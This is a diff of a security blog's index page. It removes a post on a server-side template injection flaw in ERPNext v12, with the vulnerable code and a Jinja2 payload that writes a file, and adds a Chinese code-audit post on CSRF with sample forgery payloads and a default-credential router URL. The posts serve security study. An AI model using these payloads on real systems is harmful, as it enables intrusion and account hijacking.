@@ -163,77 +163,6 @@
 </nav>
       <div class="body-wrap">
   
-    <article id="post-ErpnextV12-SSTI-vulnerability" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2019/09/20/ErpnextV12-SSTI-vulnerability/" class="article-date">
-  	<time datetime="2019-09-20T01:57:59.000Z" itemprop="datePublished">2019-09-20</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/09/20/ErpnextV12-SSTI-vulnerability/">
-        ErpnextV12 SSTI vulnerability
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>There is a SSTI vulnerability that can lead python code execution on the web server.</p>
-<p>This vulnerability  is caused by the render_string_template function and the get_email_subject_for_2fa function.These function allow users to modify templates string before passed to render function.In the source file twofactor.py,we can find a Controllable variable.</p>
-<p>Take a look at  the get_email_subject_for_2fa function.The function get the value of otp_issuer_name and then pass it to the render_string_template function.The value of otp_issuer_name can be set by system setting</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_email_subject_for_2fa</span><span class="params">(kwargs_dict)</span>:</span></span><br><span class="line">	<span class="string">'''Get email subject for 2fa.'''</span></span><br><span class="line">	subject_template = _(<span class="string">'Login Verification Code from &#123;&#125;'</span>).format(frappe.db.get_value(<span class="string">'System Settings'</span>, <span class="string">'System Settings'</span>, <span class="string">'otp_issuer_name'</span>))</span><br><span class="line">	subject = render_string_template(subject_template, kwargs_dict)</span><br><span class="line">	<span class="keyword">return</span> subject</span><br></pre></td></tr></table></figure>
-<p>So let’s look at the render_string_template function.It  render the template string using jinja2.This a normal SSTI vulnerability.</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">render_string_template</span><span class="params">(_str, kwargs_dict)</span>:</span></span><br><span class="line">	<span class="string">'''Render string with jinja.'''</span></span><br><span class="line">	s = Template(_str)</span><br><span class="line">	s = s.render(**kwargs_dict)</span><br><span class="line">	<span class="keyword">return</span> s</span><br></pre></td></tr></table></figure>
-<p>Now,login the administrator account and go to the url  <a href="http://192.168.171.132/desk#Form/System%20Settings" target="_blank" rel="noopener">http://192.168.171.132/desk#Form/System%20Settings</a>.</p>
-<p><img src="/2019/09/20/ErpnextV12-SSTI-vulnerability/1.png" alt=""></p>
-<p>Enable the Two-Factor Authentication,and change the value of OTP发行人名称 to this payload.</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; &apos;&apos;.__class__.__mro__[2].__subclasses__()[40](&apos;/tmp/hltest&apos;, &apos;w&apos;).write(&apos;hltest&apos;) &#125;&#125;</span><br></pre></td></tr></table></figure>
-<p><img src="/2019/09/20/ErpnextV12-SSTI-vulnerability/2.png" alt=""></p>
-<p>Save the setting,and exit.</p>
-<p>login a account which support the Two-Factor Authentication.</p>
-<p><img src="/2019/09/20/ErpnextV12-SSTI-vulnerability/3.png" alt=""></p>
-<p>When you see this message,you can see a file </p>
-<p>named hltest in the tmp dir.</p>
-<p><img src="/2019/09/20/ErpnextV12-SSTI-vulnerability/4.png" alt=""></p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
     <article id="post-进程保护技术学习和总结" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -1711,6 +1640,87 @@
 <h4 id="后端验证"><a href="#后端验证" class="headerlink" title="后端验证"></a>后端验证</h4><ul>
 <li>MIME类型<br>即content-type(content-type 这个头部)<br>各类MIME类型：<br><a href="http://baike.sogou.com/v40102.htm?fromTitle=MIME" target="_blank" rel="noopener">http://baike.sogou.com/v40102.htm?fromTitle=MIME</a></li>
 <li></li>
+</ul>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/php/">php</a></li></ul>
+	</div>
+
+      
+	<div class="article-category tagcloud">
+	<a class="article-category-link" href="/categories/code/">code</a>
+	</div>
+
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+    <article id="post-代码审计之csrf" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2018/02/25/代码审计之csrf/" class="article-date">
+  	<time datetime="2018-02-25T13:20:45.000Z" itemprop="datePublished">2018-02-25</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/02/25/代码审计之csrf/">
+        代码审计之csrf
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="session与cookies"><a href="#session与cookies" class="headerlink" title="session与cookies"></a>session与cookies</h3><p>session的本质是cookies，这二者都是一种身份令牌，用来向服务器证明身份，以实现进行相关操作的时候进行隐式的身份认证．</p>
+<h3 id="csrf原理"><a href="#csrf原理" class="headerlink" title="csrf原理"></a>csrf原理</h3><p>核心在于关键的请求是可以伪造，被复用，不具有唯一性．一旦能够伪造正常请求则可能劫持正常用户．</p>
+<h3 id="csrf利用"><a href="#csrf利用" class="headerlink" title="csrf利用"></a>csrf利用</h3><ul>
+<li><p>GET型</p>
+<pre><code>&lt;img src=&quot;http://www.vulner.com/vul.php?buy=1&amp;id=1&quot; /&gt;
+</code></pre><p>  只要在一个页面里加上这段代码就可以了</p>
+</li>
+<li><p>POST型</p>
+<pre><code>&lt;form action=http://wooyun.org/csrf.php method=POST&gt;
+&lt;input type=&quot;text&quot; name=&quot;xx&quot; value=&quot;11&quot; /&gt;
+&lt;/form&gt;
+&lt;script&gt; document.forms[0].submit(); &lt;/script&gt; 
+</code></pre></li>
+<li><p>顺道破解弱口令型</p>
+<pre><code>&lt;img src=http://admin:admin@192.168.1.1 /&gt; 
+获得一个路由器的session
+接下来就可以配合csrf了．
+</code></pre></li>
 </ul>
 
       
